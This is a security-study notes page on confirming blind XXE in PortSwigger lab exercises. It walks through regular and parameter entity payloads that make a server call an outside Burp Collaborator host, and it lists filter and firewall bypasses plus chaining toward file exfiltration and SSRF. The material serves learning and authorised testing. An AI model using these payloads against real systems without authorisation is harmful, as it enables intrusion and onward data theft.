# XXE — Blind out-of-band interaction

When the XML response doesn't reflect entity values, confirm XXE via out-of-band DNS/HTTP to Burp Collaborator. Use regular entities first; if those are filtered, escalate to parameter entities (`%xxe;`) which are referenced in the DTD itself rather than the XML body.

## Quick reference
```xml
<!-- Regular entity OOB (reference in XML body with &xxe;) -->
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

<!-- Parameter entity OOB (auto-triggers in DTD, no body reference needed) -->
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Root cause
The XML parser fetches the SYSTEM URL as part of entity resolution — even if the application doesn't include the entity value in any response. The network request is made server-side, detectable via Collaborator's DNS/HTTP listener.

## Find it
1. Suspect blind XXE when XML is parsed but entity values aren't echoed back.
2. Insert Collaborator URL as SYSTEM identifier.
3. Check Collaborator → if DNS/HTTP hit arrives → blind XXE confirmed.
4. If regular entity produces no hit → try parameter entity variant.

## Technique
**Regular entity OOB:**
1. Intercept XML POST.
2. Right-click → "Insert Collaborator payload" to get a subdomain.
3. Inject:
   ```xml
   <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-COLLAB-SUBDOMAIN"> ]>
   ```
4. Add `&xxe;` reference in a text node value (productId, etc.).
5. Send request → poll Collaborator → expect DNS and HTTP interactions.

**Parameter entity OOB (when regular entities blocked):**
1. Same Collaborator subdomain.
2. Inject:
   ```xml
   <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-COLLAB-SUBDOMAIN"> %xxe; ]>
   ```
3. No body reference needed — `%xxe;` is used directly in the internal DTD subset.
4. Send → poll Collaborator → DNS/HTTP interaction confirms XXE.

## Payload arsenal
```xml
<!-- Regular entity -->
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://COLLAB.burpcollaborator.net"> ]>
<!-- reference in body: &xxe; -->

<!-- Parameter entity -->
<!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://COLLAB.burpcollaborator.net"> %xxe; ]>
<!-- no body reference needed -->
```

## Bypasses
| Defense | Bypass |
|---|---|
| Regular entity `&xxe;` blocked in XML body | Switch to parameter entity `%xxe;` in DTD |
| OOB HTTP blocked (firewall) | Try DNS-only; Collaborator still gets DNS hit |
| Both blocked | Use external DTD chain → see Blind-data-exfiltration/ |

## Exploitation walkthrough
**Lab 1 (regular entity):** Inject DOCTYPE with Collaborator URL → reference `&xxe;` in productId → poll Collaborator → DNS + HTTP interaction appears → blind XXE confirmed.

**Lab 2 (parameter entity):** Same, but regular entity produces no hit. Switch to `%xxe;` in DTD subset → poll Collaborator → interactions appear. Key insight: parameter entities bypass filters that strip `&entity;` references from XML body.

## Chaining
- Blind OOB confirms XXE → escalate to [Blind-data-exfiltration](../Blind-data-exfiltration/) with external DTD to get actual file contents
- OOB HTTP → internal host discovery via SSRF

## Tools
- **Burp Collaborator** — DNS/HTTP listener; right-click "Insert Collaborator payload" in Repeater

## Labs

### Blind XXE with out-of-band interaction [Practitioner]
Insert Collaborator URL as regular entity SYSTEM target; reference `&xxe;` in productId. Poll Collaborator — receives DNS and HTTP. Key insight: entity fetched even when value not reflected in response.

### Blind XXE with out-of-band interaction via XML parameter entities [Practitioner]
Regular entity filtered. Use `%xxe;` parameter entity syntax in internal DTD subset — no body reference needed. Collaborator still receives OOB interaction. Key insight: parameter entities (`%`) are processed during DTD parsing, bypassing filters on `&entity;` body references.

## Real-world notes
- Blind XXE is far more common than reflected XXE — most parsers process entities silently.
- Parameter entities are less commonly filtered because they're lesser-known; always try them.
- DNS hit alone (without HTTP) still confirms XXE — useful when HTTP egress is blocked.

## References
- https://portswigger.net/web-security/xxe/blind
